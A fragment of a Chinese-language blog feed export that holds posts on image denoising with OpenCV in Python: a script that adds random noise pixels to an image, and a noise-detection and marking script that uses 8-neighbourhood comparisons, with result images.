class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p_sum = <span class="built_in">int</span>(p[<span class="number">0</span>])+<span class="built_in">int</span>(p[<span class="number">1</span>])+<span class="built_in">int</span>(p[<span class="number">2</span>])+<span class="built_in">int</span>(p[<span class="number">3</span>])+<span class="built_in">int</span>(p[<span class="number">4</span>])+<span class="built_in">int</span>(p[<span class="number">5</span>])+<span class="built_in">int</span>(p[<span class="number">6</span>])+<span class="built_in">int</span>(p[<span class="number">7</span>])</span><br><span class="line">    max_differ = <span class="number">0</span></span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>) &gt; max_differ:</span><br><span class="line">            max_differ = <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>)</span><br><span class="line">            max_index = i</span><br><span class="line">    <span class="keyword">if</span> max_differ &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> _1d_2_2d(max_index)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 考虑位置</span></span><br><span class="line">            part2, flag2 = division2(_8_area)</span><br><span class="line">            <span class="keyword">if</span> flag1 == <span class="literal">False</span> <span class="keyword">or</span> flag2 == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            sx, sy = special_check(_8_area)</span><br><span class="line">            <span class="keyword">if</span> sx != -<span class="number">1</span>:</span><br><span class="line">                result[i - <span class="number">1</span> + sx][j - <span class="number">1</span> + sy] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 比较</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> part1[k] != part2[k]:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                pixel_channel.channel[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                pixel_channel.channel[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel.col):</span><br><span class="line">            <span class="keyword">if</span> half_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                pixel_channel.channel[i*<span class="number">2</span>][j*<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    half_b = half(b)</span><br><span class="line">    half_g = half(g)</span><br><span class="line">    half_r = half(r)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    fp = open(&#x27;half_b.noise.csv&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">    for i in range(half_b.row):</span></span><br><span class="line"><span class="string">        for j in range(half_b.col):</span></span><br><span class="line"><span class="string">            print(half_b.noise[i][j], file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">            print(&quot;,&quot;, file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">        print(&quot;&quot;, file=fp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fp = open(&#x27;half_b.pixel.csv&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">    for i in range(half_b.row):</span></span><br><span class="line"><span class="string">        for j in range(half_b.col):</span></span><br><span class="line"><span class="string">            print(half_b.channel[i][j], file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">            print(&quot;,&quot;, file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">        print(&quot;&quot;, file=fp)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不考虑二分之一图像</span></span><br><span class="line">    <span class="comment"># new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑二分之一图像</span></span><br><span class="line">    new_img = cv.merge((mark(b, half_b).channel, mark(g, half_g).channel, mark(r, half_r).channel))</span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011544919.png" alt="3"></p><p>可以看到连在一起的噪声块中，有更多的噪声被找到并标记</p><p>下面进行对比：</p><p>不考虑二分之一图像的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011545688.png" alt="2"></p><p>考虑二分之一图像的结果：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011545066.png" alt="3 - 副本" style="zoom: 150%;" /><p>可以看出，考虑二分之一图像的结果中，连在一起的噪声块中有噪声点被标记出，这里标记成黑色。</p><p>但如果修改成所需要的颜色的话，那么可以进一步将靠近的噪声点“孤立”出来，将结果再进行降噪，那么就基本可以消除连在一起的噪声</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210418</title>
      <link href="/20210418-img-report/"/>
      <url>/20210418-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="图片素材"><a href="#图片素材" class="headerlink" title="图片素材"></a>图片素材</h2><p><img src="https://i.loli.net/2021/04/18/nmdAgaHXx9k5ulB.png" alt="img"></p><h2 id="人为给出噪声"><a href="#人为给出噪声" class="headerlink" title="人为给出噪声"></a>人为给出噪声</h2><p>随机100个噪声点</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = cv.imread(<span class="string">&quot;img.png&quot;</span>, <span class="number">1</span>)</span><br><span class="line">(rows, cols, chn) = img.shape</span><br><span class="line">cv.imshow(<span class="string">&quot;img.png&quot;</span>, img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加噪声</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    x = np.random.randint(<span class="number">0</span>, rows)</span><br><span class="line">    y = np.random.randint(<span class="number">0</span>, cols)</span><br><span class="line">    img[x, y, :] = <span class="number">255</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cv.imshow(<span class="string">&quot;noise&quot;</span>, img)</span><br><span class="line">cv.imwrite(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">cv.waitKey()</span><br><span class="line">cv.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://i.loli.net/2021/04/18/2LIZxyAGBvc3ETm.png" alt="2"></p><h2 id="噪声检测"><a href="#噪声检测" class="headerlink" title="噪声检测"></a>噪声检测</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.将图片缩小二分之一：（这里只给出了生成部分，没有给出检测部分）</span></span><br><span class="line"><span class="string">    取左上角的点</span></span><br><span class="line"><span class="string">2.找出噪声点：</span></span><br><span class="line"><span class="string">    划分方法一</span></span><br><span class="line"><span class="string">    划分方法二</span></span><br><span class="line"><span class="string">    处理特殊点</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">3.标记</span></span><br><span class="line"><span class="string">    将噪声点的像素值标记为0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图像缩小到一半</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    result = PixelChannel()</span><br><span class="line">    result.row = half_row</span><br><span class="line">    result.col = half_col</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, <span class="number">2</span>):</span><br><span class="line">            result.channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    min_index = 0</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &lt; p[min_index]:</span></span><br><span class="line"><span class="string">            min_index = i</span></span><br><span class="line"><span class="string">    max_index1 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &gt; p[max_index1]:</span></span><br><span class="line"><span class="string">            max_index1 = i</span></span><br><span class="line"><span class="string">    max_index2 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and p[i] &gt; p[max_index2]:</span></span><br><span class="line"><span class="string">            max_index2 = i</span></span><br><span class="line"><span class="string">    max_index3 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and p[i] &gt; p[max_index3]:</span></span><br><span class="line"><span class="string">            max_index3 = i</span></span><br><span class="line"><span class="string">    max_index4 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and i != max_index3 and p[i] &gt; p[max_index4]:</span></span><br><span class="line"><span class="string">            max_index4 = i</span></span><br><span class="line"><span class="string">    # 将较小的的四个标记为1区域，较大区域标记为2</span></span><br><span class="line"><span class="string">    result[max_index1] = 2</span></span><br><span class="line"><span class="string">    result[max_index2] = 2</span></span><br><span class="line"><span class="string">    result[max_index3] = 2</span></span><br><span class="line"><span class="string">    result[max_index4] = 2</span></span><br><span class="line"><span class="string">    for i in range(8):</span></span><br><span class="line"><span class="string">        if result[i] != 2:</span></span><br><span class="line"><span class="string">            result[i] = 1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    d = [<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>]), <span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>]), <span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>]), <span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>]),</span><br><span class="line">         <span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>]), <span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]), <span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]), <span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">0</span>])]</span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> d[i] &gt; d[max_index]:</span><br><span class="line">            max_index = i</span><br><span class="line">        <span class="keyword">if</span> d[i] &lt; d[min_index]:</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">if</span> max_index == min_index:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &gt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> max_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span 